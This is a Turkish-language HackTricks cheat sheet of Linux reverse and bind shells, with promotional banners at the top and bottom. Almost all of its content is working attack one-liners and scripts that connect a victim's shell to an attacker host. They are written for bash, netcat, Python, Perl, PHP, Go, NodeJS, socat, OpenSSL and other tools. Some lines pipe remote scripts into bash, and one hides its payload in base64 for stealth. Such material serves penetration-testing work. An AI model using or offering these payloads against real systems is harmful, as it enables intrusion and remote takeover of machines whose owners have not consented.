# Kabuklar - Linux

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i(https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**Try Hard Güvenlik Grubu**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

**Bu kabuklardan herhangi biri hakkında sorularınız varsa** [**https://explainshell.com/**](https://explainshell.com) **adresinden kontrol edebilirsiniz.**

## Tam TTY

**Bir ters kabuk aldıktan sonra** [**bu sayfayı tam TTY almak için okuyun**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Sembol güvenli kabuk

Diğer kabuklarla da kontrol etmeyi unutmayın: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh ve bash.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Kabuk açıklaması

1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash kabuğu başlatır.
2. **`>&`**: Bu komutun bu kısmı, **standart çıktı** (`stdout`) ve **standart hata** (`stderr`) çıktılarını **aynı hedefe yönlendirmek** için kısa bir notasyondur.
3. **`/dev/tcp/<SALDIRGAN-IP>/<PORT>`**: Bu, belirtilen IP adresine ve porta **TCP bağlantısını temsil eden özel bir dosyadır**.
* **Çıktı ve hata akışlarını bu dosyaya yönlendirerek**, komut etkileşimli kabuk oturumunun çıktısını saldırganın makinesine gönderir.
4. **`0>&1`**: Bu komutun bu kısmı, **standart girişi (`stdin`) standart çıktıya (`stdout`)** yönlendirir.

### Dosyada oluştur ve çalıştır
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## İleriye Dönük Kabuk

Linux tabanlı bir web uygulamasında **Uzaktan Kod Yürütme (RCE)** açığıyla uğraşırken, ters kabuk elde etme işlemi, iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Bu tür kısıtlı ortamlarda, alternatif bir yaklaşım, etkilenen sistemle daha etkili bir şekilde etkileşim kurmak için bir PTY (Pseudo Terminal) kabuğu oluşturmaktır.

Bu amaç için önerilen bir araç [toboggan](https://github.com/n3rada/toboggan.git)'dır, bu araç hedef ortamla etkileşimi basitleştirir.

Toboggan'ı etkili bir şekilde kullanmak için, hedef sistemin RCE bağlamına uygun bir Python modülü oluşturun. Örneğin, `nix.py` adında bir modül aşağıdaki gibi yapılandırılabilir:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
Ve ardından şunu çalıştırabilirsiniz:
```shell
toboggan -m nix.py -i
```
Doğrudan etkileşimli bir kabuk kullanmak için. Burpsuite entegrasyonu için `-b` ekleyebilir ve daha temel bir rce sarmalayıcı için `-i`'yi kaldırabilirsiniz.

Başka bir olasılık, `IppSec` ileri kabuk uygulamasını kullanmaktır [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).

Sadece şunları değiştirmeniz gerekir:

* Zafiyetli ana bilgisayarın URL'si
* Yükünüzün öneki ve soneki (varsa)
* Yükün gönderildiği şekil (başlıklar mı? veri mi? ekstra bilgi mi?)

Sonra, sadece **komutlar gönderebilirsiniz** veya hatta tam bir PTY almak için **`upgrade` komutunu kullanabilirsiniz** (boruların okunması ve yazılması yaklaşık 1.3 saniyelik bir gecikme ile gerçekleşir).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) adresinde kontrol edin.
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet, ağ protokolüdür ve birçok işletim sistemi tarafından desteklenir. Bir sunucuya uzaktan erişim sağlamak için kullanılabilir. Güvenlik nedeniyle, Telnet yerine SSH gibi daha güvenli protokoller tercih edilmelidir.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Saldırgan**
```bash
while true; do nc -l <port>; done
```
Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)

**Hedef**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python, yüksek seviyeli bir programlama dili ve genel amaçlı bir dil olarak popülerdir. Python, hızlı prototipleme, veri analizi ve otomasyon gibi birçok alanda kullanılır. Ayrıca, çeşitli kütüphaneleri ve modülleri sayesinde geniş bir kullanıcı kitlesine sahiptir.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl, birçok Linux dağıtımında önceden yüklü olarak gelen bir programlama dilidir. Perl betikleri, Linux üzerinde hızlı ve etkili bir şekilde çalıştırılabilir. Perl, sistem yöneticileri ve güvenlik uzmanları tarafından sıklıkla kullanılan bir dil olduğundan, hedef sistemde Perl yüklü olma olasılığı oldukça yüksektir. Bu nedenle, Perl betikleri sıklıkla hedef sistemlere erişim sağlamak için kullanılır.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby, açık kaynaklı, nesne yönelimli bir programlama dilidir. Ruby, basit ve okunabilir sözdizimi ile dikkat çeker. Ruby programlama dili, Ruby on Rails çerçevesi ile web uygulamaları geliştirmek için sıkça kullanılır.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP, Hypertext Preprocessor'ın kısaltmasıdır ve genellikle web geliştirme için kullanılan bir betik dili olarak bilinir. PHP, sunucu taraflı bir dil olduğundan, sunucuda çalıştırılır ve HTML içine gömülebilir. Dinamik web sayfaları oluşturmak için sıklıkla kullanılır ve veritabanı işlemleri gibi çeşitli görevleri yerine getirebilir.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java, Oracle Corporation tarafından geliştirilen ve popüler bir programlama dilidir. Java, nesne yönelimli, sınıf tabanlı ve platform bağımsız bir dildir. Java, genellikle büyük ölçekli uygulamaların geliştirilmesinde tercih edilir ve mobil uygulamalardan büyük veri işleme sistemlerine kadar çeşitli alanlarda kullanılır. Java, geniş kütüphaneleri ve güvenliği ile bilinir.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

### Linux

#### Reverse Shell

Reverse shell almak için Go programlama dili kullanarak bir reverse shell yazabilirsiniz. Bu, hedef bir Linux makinesine bağlanmanıza olanak tanır.

```go
package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	conn, _ := net.Dial("tcp", "hedef_ip:port")
	for {
		cmd := exec.Command("/bin/sh", "-i")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
	_ = cmd.Run()
	}
}
```

Bu kod, hedef IP adresi ve port numarasını değiştirmeniz gereken basit bir reverse shell örneğidir.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua, bir betik dili ve hafif bir çoklu programlama dilidir. Lua, C programlama diline benzer bir sözdizimine sahiptir ve C ile kolayca entegre edilebilir. Lua, oyun geliştirme endüstrisinde ve diğer uygulama alanlarında sıkça kullanılmaktadır. Lua, basit ve hızlı bir şekilde öğrenilebilir ve genellikle betik dili olarak kullanılır. Lua, esnek bir dil olup, farklı programlama paradigmasını destekler. Lua, açık kaynak kodlu bir projedir ve aktif bir topluluğa sahiptir.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Saldırgan (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Kurban
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bağlama kabuğu
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Ters Kabuk
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk, Linux'ta sıkça kullanılan bir komut satırı aracıdır. Metin dosyalarını işlemek için kullanılır ve genellikle metin işleme ve veri çıkarma işlemlerinde kullanılır. Awk, metin dosyalarını satır satır okur, belirli desenlere göre satırları işler ve belirli eylemler gerçekleştirir. Awk, komut satırında kullanıldığında oldukça güçlü ve esnek bir araçtır.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Parmak

**Saldırgan**
```bash
while true; do nc -l 79; done
```
Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)

**Hedef**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

### Gawk

Gawk, GNU Project tarafından geliştirilen bir metin işleme dili ve programlama ortamıdır. Genellikle metin dosyalarını işlemek için kullanılır. Gawk, Linux sistemlerinde sıkça kullanılan bir araçtır ve metin işleme, veri çıkarma ve raporlama gibi görevler için oldukça güçlü bir araçtır. Gawk'ın esnek ve güçlü bir dil olması, onu birçok farklı senaryoda kullanılabilir kılar.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Bu, sistemize 6001 numaralı porta bağlanmaya çalışacaktır:
```bash
xterm -display 10.0.0.1:1
```
Ters kabuk yakalamak için kullanabilirsiniz (port 6001'de dinleyecek):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

[frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) tarafından NOT: Java ters kabuk aynı zamanda Groovy için de çalışır.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Referanslar

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Sıfırdan kahraman olacak şekilde AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
